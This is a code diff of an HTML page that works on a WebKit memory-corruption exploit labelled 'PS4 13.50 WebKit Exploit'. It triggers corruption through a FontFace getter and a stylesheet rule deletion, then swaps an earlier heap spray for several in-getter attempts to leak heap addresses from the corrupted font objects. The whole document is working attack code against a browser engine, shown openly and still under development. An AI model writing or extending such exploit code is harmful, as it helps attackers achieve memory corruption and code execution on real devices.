@@ -6,36 +6,22 @@
 </style>
 </head>
 <body>
-<div id="log" style="font-family: monospace; font-size: 12px; white-space: pre;"></div>
+<div id="log" style="font-family: monospace; font-size: 11px; white-space: pre;"></div>
 <script>
 function log(msg) {
-    document.getElementById('log').textContent += msg + '\n';
+    let d = document.getElementById('log');
+    if (d) d.textContent += msg + '\n';
 }
 
 function hex(n) {
-    if (typeof n === 'number') {
-        return '0x' + n.toString(16);
-    }
-    return n;
+    return '0x' + n.toString(16).padStart(8, '0');
 }
 
-// Spray arrays to control heap layout
-let spray_arrays = [];
-let marker_obj = { marker: 0x41424344 };
+// Global storage for leak attempts
+let leaked_data = [];
 
 window.onload = () => {
-    log('[*] PS4 13.50 WebKit Exploit - Corruption + Leak Attempt\n');
-    
-    // Heap spray BEFORE corruption
-    log('[*] Phase 1: Heap spray...');
-    for (let i = 0; i < 1000; i++) {
-        let arr = new Uint32Array(0x100);
-        for (let j = 0; j < arr.length; j++) {
-            arr[j] = 0x41414140 + i;
-        }
-        spray_arrays.push(arr);
-    }
-    log('    Created 1000 Uint32Arrays\n');
+    log('[*] PS4 13.50 WebKit Exploit - Leak Inside Getter\n');
     
     let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
     document.fonts.add(A);
@@ -48,81 +34,129 @@ window.onload = () => {
             if (!fired && this === A) {
                 fired = true;
                 
-                log('[*] Phase 2: Triggering corruption...');
+                log('[+] INSIDE GETTER - We have ~milliseconds before OOM');
+                log('[+] Triggering corruption...\n');
                 
-                // Create corruption WITHOUT storing references
-                // (storing them might keep them alive and trigger GC issues)
-                new FontFace('y', 'local(Helvetica Bold)', { unicodeRange: 'U+0041' });
-                new FontFace('z', 'local(Helvetica Italic)', { unicodeRange: 'U+0041' });
+                // Create corrupted fonts
+                let y = new FontFace('y', 'local(Helvetica Bold)', { unicodeRange: 'U+0041' });
+                let z = new FontFace('z', 'local(Helvetica Italic)', { unicodeRange: 'U+0041' });
                 
                 document.getElementById('s').sheet.deleteRule(0);
                 document.body.offsetTop;
                 
-                log('    Corruption triggered\n');
+                log('[+] Corruption done! Now attempting exploitation...\n');
                 
-                throw new Error("Exit");
+                // ===== EXPLOITATION STARTS HERE =====
+                
+                // Strategy 1: Try to read internal properties that might leak addresses
+                try {
+                    log('Strategy 1: Probing corrupted font objects');
+                    log('  y.family: "' + y.family + '"');
+                    log('  y.style: "' + y.style + '"');
+                    log('  y.weight: "' + y.weight + '"');
+                    log('  y.stretch: "' + y.stretch + '"');
+                    log('  y.unicodeRange: "' + y.unicodeRange + '"');
+                    log('  y.variant: "' + y.variant + '"');
+                    log('  y.featureSettings: "' + y.featureSettings + '"');
+                    log('  y.display: "' + y.display + '"');
+                    
+                    // Try to access the loaded promise (might contain heap ptrs)
+                    let p = y.loaded;
+                    log('  y.loaded: ' + p);
+                    log('  y.loaded.constructor.name: ' + p.constructor.name);
+                    
+                } catch(e) {
+                    log('  ERROR: ' + e.message);
+                }
+                
+                // Strategy 2: Create arrays and try to cause overlap/confusion
+                try {
+                    log('\nStrategy 2: Heap manipulation');
+                    
+                    let arr1 = new Uint32Array(0x100);
+                    let arr2 = new Float64Array(0x100);
+                    
+                    // Fill with patterns
+                    for (let i = 0; i < 0x100; i++) {
+                        arr1[i] = 0x41414141 + i;
+                        arr2[i] = 1.5 + i;
+                    }
+                    
+                    log('  Created Uint32Array and Float64Array');
+                    log('  arr1[0]: ' + hex(arr1[0]));
+                    log('  arr2[0]: ' + arr2[0]);
+                    
+                    // Store for potential use
+                    leaked_data.push(arr1, arr2);
+                    
+                } catch(e) {
+                    log('  ERROR: ' + e.message);
+                }
+                
+                // Strategy 3: Try to leak via object shape confusion
+                try {
+                    log('\nStrategy 3: Object property leak attempt');
+                    
+                    let leak_obj = {};
+                    leak_obj.a = y;
+                    leak_obj.b = z;
+                    leak_obj.c = A;
+                    
+                    // Try to read back - in corrupted state might leak ptrs
+                    log('  leak_obj.a: ' + leak_obj.a);
+                    log('  leak_obj.a === y: ' + (leak_obj.a === y));
+                    
+                } catch(e) {
+                    log('  ERROR: ' + e.message);
+                }
+                
+                // Strategy 4: Use toString/valueOf which might expose internals
+                try {
+                    log('\nStrategy 4: toString/valueOf on corrupted objects');
+                    
+                    log('  y.toString(): "' + y.toString() + '"');
+                    log('  y.valueOf(): ' + y.valueOf());
+                    
+                } catch(e) {
+                    log('  ERROR: ' + e.message);
+                }
+                
+                // Strategy 5: Create new corrupted fonts and compare
+                try {
+                    log('\nStrategy 5: Multiple corruption iterations');
+                    
+                    for (let i = 0; i < 5; i++) {
+                        let f = new FontFace('corrupt' + i, 'local(Helvetica)', {
+                            unicodeRange: 'U+004' + i.toString(16)
+                        });
+                        log('  Font[' + i + '] created');
+                    }
+                    
+                } catch(e) {
+                    log('  ERROR: ' + e.message);
+                }
+                
+                log('\n[+] Exploitation attempts complete');
+                log('[!] Returning undefined now - OOM will trigger...');
+                
+                // Store everything we can before OOM
+                window.exploit_y = y;
+                window.exploit_z = z;
+                window.exploit_leaked = leaked_data;
             }
+            
+            // Returning undefined will trigger the OOM
             return undefined;
         }
     });
     
-    try {
-        document.fonts.load('1em x', 'AB');
-    } catch(e) {
-        log('[*] Exception caught\n');
-    }
+    log('[*] Calling fonts.load() - will trigger OOM after exploitation...\n');
+    document.fonts.load('1em x', 'AB');
     
+    // This will never execute due to OOM
     setTimeout(() => {
-        log('[*] Phase 3: Attempting memory leak...\n');
-        
-        // Try to leak heap addresses through various WebKit objects
-        
-        // Method 1: ArrayBuffer correlation
-        try {
-            log('Test 1: ArrayBuffer address patterns');
-            let test_arr = new Uint32Array(0x10);
-            test_arr[0] = 0xdeadbeef;
-            test_arr[1] = 0xcafebabe;
-            
-            // In corrupted state, object properties might leak
-            log('  test_arr.length: ' + test_arr.length);
-            log('  test_arr.byteLength: ' + test_arr.byteLength);
-            log('  test_arr.byteOffset: ' + test_arr.byteOffset);
-            
-        } catch(e) {
-            log('  Error: ' + e.message);
-        }
-        
-        // Method 2: Try to create objects in the corrupted heap region
-        log('\nTest 2: Object creation in corrupted heap');
-        try {
-            let leak_obj = {};
-            leak_obj.a = spray_arrays[0];
-            leak_obj.b = spray_arrays[500];
-            leak_obj.c = marker_obj;
-            
-            log('  leak_obj created');
-            
-        } catch(e) {
-            log('  Error: ' + e.message);
-        }
-        
-        // Method 3: Try to observe corruption side effects
-        log('\nTest 3: Checking document.fonts state');
-        try {
-            log('  document.fonts.size: ' + document.fonts.size);
-            log('  document.fonts.status: ' + document.fonts.status);
-            
-            // DON'T iterate or call .load() - that triggers OOM
-            
-        } catch(e) {
-            log('  Error: ' + e.message);
-        }
-        
-        log('\n[*] Leak attempt complete');
-        log('[*] Next: Need to find what the corruption actually gives us');
-        
-    }, 500);
+        log('[!] If you see this, we prevented OOM somehow');
+    }, 0);
 };
 </script>
 </body>
